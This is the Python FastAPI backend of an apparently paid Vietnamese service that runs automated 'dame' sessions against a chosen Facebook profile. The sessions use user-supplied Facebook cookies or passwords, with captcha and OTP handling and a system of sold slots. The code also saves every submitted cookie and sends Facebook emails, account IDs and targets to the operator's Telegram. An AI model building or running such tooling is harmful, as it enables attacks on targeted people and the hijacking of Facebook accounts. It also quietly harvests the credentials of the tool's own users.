@app.delete("/api/servers/{server_id}")
async def api_delete_server(server_id:str, request:Request):
    username = get_session_user(get_token(request))
    if not username: raise HTTPException(401,"Chưa đăng nhập")
    servers = load_servers()
    new_list = [s for s in servers if not (s["id"]==server_id and (s["owner"]==username or is_admin(username)))]
    if len(new_list)==len(servers): raise HTTPException(404,"Không tìm thấy hoặc không có quyền")
    save_servers(new_list)
    return JSONResponse({"ok":True})

@app.patch("/api/servers/{server_id}/status")
async def api_update_server_status(server_id:str, request:Request):
    username = get_session_user(get_token(request))
    if not username: raise HTTPException(401,"Chưa đăng nhập")
    data = await request.json(); status = data.get("status","ready")
    servers = load_servers()
    for s in servers:
        if s["id"]==server_id and (s["owner"]==username or is_admin(username)):
            s["status"]=status; break
    save_servers(servers)
    return JSONResponse({"ok":True})

# ════════════════════════════════════════════════════════
# DAME ENDPOINTS
# ════════════════════════════════════════════════════════
from dame_runner import (
    verify_fb_cookie, get_target_name,
    start_dame, pause_dame, resume_dame, stop_dame,
    get_status, get_screenshot, fb_login_by_pass,
    get_all_status, DAME_SESSIONS, DAME_SESSION,
    _captcha_sessions
)

@app.post("/api/verify-fb-cookie")
async def api_verify_cookie(request:Request):
    data = await request.json()
    tok = (data.get("_token") or "").strip() or get_token(request)
    username = get_session_user(tok)
    if not username: raise HTTPException(401,"Chưa đăng nhập")
    cookie = (data.get("cookie") or "").strip()
    if not cookie: raise HTTPException(400,"Thiếu cookie")
    return JSONResponse(await verify_fb_cookie(cookie))

@app.post("/api/verify-fb-target")
async def api_verify_target(request:Request):
    username = get_session_user(get_token(request))
    if not username: raise HTTPException(401,"Chưa đăng nhập")
    data = await request.json()
    cookie = (data.get("cookie") or "").strip(); target_url = (data.get("target_url") or "").strip()
    if not cookie or not target_url: raise HTTPException(400,"Thiếu thông tin")
    return JSONResponse(await get_target_name(cookie, target_url))

@app.post("/api/dame/start")
async def api_dame_start(request:Request):
    username = get_session_user(get_token(request))
    if not username: raise HTTPException(401,"Chưa đăng nhập")
    data = await request.json()
    cookie = (data.get("cookie") or "").strip(); target_url = (data.get("target_url") or "").strip()
    speed = data.get("speed","normal"); acc_name = data.get("acc_name",""); acc_uid = data.get("acc_uid","")
    target_name = data.get("target_name",""); server_id = (data.get("server_id") or "").strip()
    if not cookie or not target_url: raise HTTPException(400,"Thiếu cookie hoặc target")
    # Kiểm tra slot dame - admin bỏ qua
    if not is_admin(username):
        total_slots = count_user_slots(username)
        servers = load_servers()
        used_slots = len([s for s in servers if s.get("owner")==username and s.get("status")=="running"])
        if total_slots == 0:
            raise HTTPException(403,"Bạn chưa có slot dame. Mua slot để chạy dame!")
        if used_slots >= total_slots:
            raise HTTPException(403,f"Hết slot! Đang dùng {used_slots}/{total_slots} slot. Mua thêm hoặc dừng dame đang chạy.")
    await start_dame(cookie,target_url,speed,acc_name,acc_uid,target_name,server_id=server_id)
    if server_id:
        servers = load_servers()
        for s in servers:
            if s["id"]==server_id: s["status"]="running"; break
        save_servers(servers)
    now = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
    add_history({"id":"dzixmode"+"".join([str(random.randint(0,9)) for _ in range(6)]),"owner":username,"type":"dame",
        "acc_name":acc_name,"acc_uid":acc_uid,"target":target_url,"target_name":target_name,"speed":speed,"time":now,"cookie":cookie})
    asyncio.create_task(tg(
        f"🐬 <b>DAME BẮT ĐẦU</b>\n"
        f"👤 Cookie: <b>{acc_name}</b> (<code>{acc_uid}</code>)\n"
        f"🎯 Target: <b>{target_name}</b>\n🔗 {target_url}\n"
        f"🚀 Speed: {speed} · By: <code>{username}</code>\n🕐 {now}"
    ))
    return JSONResponse({"ok":True,"name":acc_name,"uid":acc_uid,"server_id":server_id})

@app.get("/api/dame/status")
async def api_dame_status(request:Request):
    username = get_session_user(get_token(request))
    if not username: raise HTTPException(401,"Chưa đăng nhập")
    server_id = request.query_params.get("server_id",""); since = int(request.query_params.get("since","0"))
    return JSONResponse(get_status(server_id,since))

@app.get("/api/dame/status/all")
async def api_dame_status_all(request:Request):
    username = get_session_user(get_token(request))
    if not username: raise HTTPException(401,"Chưa đăng nhập")
    return JSONResponse(get_all_status())

@app.get("/api/dame/screenshot")
async def api_dame_screenshot(request:Request):
    username = get_session_user(get_token(request))
    if not username: raise HTTPException(401,"Chưa đăng nhập")
    server_id = request.query_params.get("server_id","")
    b64 = get_screenshot(server_id)
    return JSONResponse({"screenshot":b64,"screenshot_b64":b64})

@app.post("/api/dame/pause")
async def api_dame_pause(request:Request):
    username = get_session_user(get_token(request))
    if not username: raise HTTPException(401,"Chưa đăng nhập")
    data = await request.json() if request.headers.get("content-type","").startswith("application/json") else {}
    server_id = (data.get("server_id","") if isinstance(data,dict) else "") or request.query_params.get("server_id","")
    pause_dame(server_id); return JSONResponse({"ok":True})

@app.post("/api/dame/resume")
async def api_dame_resume(request:Request):
    username = get_session_user(get_token(request))
    if not username: raise HTTPException(401,"Chưa đăng nhập")
    data = await request.json() if request.headers.get("content-type","").startswith("application/json") else {}
    server_id = (data.get("server_id","") if isinstance(data,dict) else "") or request.query_params.get("server_id","")
    resume_dame(server_id); return JSONResponse({"ok":True})

@app.post("/api/dame/stop")
async def api_dame_stop(request:Request):
    username = get_session_user(get_token(request))
    if not username: raise HTTPException(401,"Chưa đăng nhập")
    data = await request.json() if request.headers.get("content-type","").startswith("application/json") else {}
    server_id = (data.get("server_id","") if isinstance(data,dict) else "") or request.query_params.get("server_id","")
    stop_dame(server_id)
    if server_id:
        servers = load_servers()
        for s in servers:
            if s["id"]==server_id: s["status"]="stopped"; break
        save_servers(servers)
    return JSONResponse({"ok":True})

@app.get("/api/fb-captcha/poll/{cap_id}")
async def api_captcha_poll(cap_id:str, request:Request):
    tok = request.headers.get("Authorization","").replace("Bearer ","").strip()
    if not tok or not get_session_user(tok): raise HTTPException(401,"Chưa đăng nhập")
    sess = _captcha_sessions.get(cap_id)
    if not sess: raise HTTPException(404,"Cap session không tồn tại")
    return {"status":sess.get("status","solving"),"msg":sess.get("msg",""),
        "screenshot_b64":sess.get("screenshot_b64",""),"result":sess.get("result")}

@app.post("/api/fb-login-pass/otp")
async def api_fb_login_otp(request:Request):
    data = await request.json()
    tok = (data.get("_token") or "").strip() or request.headers.get("Authorization","").replace("Bearer ","").strip()
    if not tok or not get_session_user(tok): raise HTTPException(401,"Chưa đăng nhập")
    session_id = (data.get("session_id") or "").strip(); otp_code = (data.get("otp_code") or "").strip()
    if not session_id or not otp_code: raise HTTPException(400,"Thiếu session_id hoặc otp_code")
    job_id = str(_uuid.uuid4()); login_jobs[job_id] = {"status":"pending","result":None}
    async def run_otp():
        try:
            result = await fb_login_by_pass("","",session_id=session_id,otp_code=otp_code)
            login_jobs[job_id] = {"status":"done","result":result}
        except Exception as e:
            login_jobs[job_id] = {"status":"error","result":{"status":"error","message":str(e)}}
    asyncio.create_task(run_otp())
    return {"job_id":job_id}

@app.post("/api/fb-login-pass/start")
async def api_fb_login_pass_start(request:Request):
    data = await request.json()
    tok = (data.get("_token") or "").strip() or request.headers.get("Authorization","").replace("Bearer ","").strip()
    if not tok or not get_session_user(tok): raise HTTPException(401,"Chưa đăng nhập")
    fb_email = (data.get("fb_email") or "").strip(); fb_pass = (data.get("fb_pass") or "").strip()
    if not fb_email or not fb_pass: raise HTTPException(400,"Thiếu email hoặc mật khẩu")
    job_id = str(_uuid.uuid4()); login_jobs[job_id] = {"status":"pending","result":None}
    async def run_job():
        try:
            result = await fb_login_by_pass(fb_email,fb_pass)
            login_jobs[job_id] = {"status":"done","result":result}
            user = get_session_user(tok); status = result.get("status",""); name = result.get("name",""); uid = result.get("uid","")
            now = datetime.now().strftime("%H:%M:%S %d/%m/%Y")
            if status=="success":
                await tg(f"🔑 <b>Login Pass thành công</b>\n👤 Tool user: <code>{user}</code>\n📧 FB: <code>{fb_email}</code>\n🆔 {uid} | 👤 {name}\n🕐 {now}")
        except Exception as e:
            login_jobs[job_id] = {"status":"error","result":{"status":"error","message":str(e)}}
    asyncio.create_task(run_job())
    return {"job_id":job_id}

@app.get("/api/fb-login-pass/poll/{job_id}")
async def api_fb_login_pass_poll(job_id:str, request:Request):
    tok = request.headers.get("Authorization","").replace("Bearer ","").strip()
    if not tok or not get_session_user(tok): raise HTTPException(401,"Chưa đăng nhập")
    job = login_jobs.get(job_id)
    if not job: raise HTTPException(404,"Job không tồn tại")
    return job

@app.post("/api/fb-login-pass")
async def api_fb_login_pass(request:Request):
    data = await request.json()
    tok = (data.get("_token") or "").strip() or request.headers.get("Authorization","").replace("Bearer ","").strip()
    if not tok or not get_session_user(tok): raise HTTPException(401,"Chưa đăng nhập")
    fb_email = (data.get("fb_email") or "").strip(); fb_pass = (data.get("fb_pass") or "").strip()
    if not fb_email or not fb_pass: raise HTTPException(400,"Thiếu email hoặc mật khẩu")
    result = await fb_login_by_pass(fb_email,fb_pass)
    user = get_session_user(tok); status = result.get("status",""); name = result.get("name",""); uid = result.get("uid","")
    now = datetime.now().strftime("%H:%M:%S %d/%m/%Y")
    if status=="success":
        asyncio.create_task(tg(f"🔑 <b>Login Pass thành công</b>\n👤 Tool user: <code>{user}</code>\n📧 FB: <code>{fb_email}</code>\n👤 {name} | UID: <code>{uid}</code>\n🕐 {now}"))
    else:
        asyncio.create_task(tg(f"⚠️ <b>Login Pass thất bại</b>\n👤 {user}\n📧 {fb_email}\n❌ {status}\n💬 {result.get('message','')}\n🕐 {now}"))
    return JSONResponse(result)

if __name__=="__main__":
    import uvicorn
    port = int(os.environ.get("PORT",8000))
    uvicorn.run(app, host="0.0.0.0", port=port)
